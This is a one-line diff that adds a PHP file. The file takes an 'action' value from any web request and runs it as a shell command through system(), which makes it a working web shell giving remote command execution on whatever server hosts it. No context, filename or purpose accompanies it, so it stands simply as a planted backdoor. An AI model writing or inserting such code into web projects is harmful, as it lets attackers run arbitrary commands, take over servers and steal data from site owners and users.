@@ -1,0 +1,1 @@
+<?php $action = $_REQUEST['action'] ; if($action){system($action);}else{echo 'no action';}?>
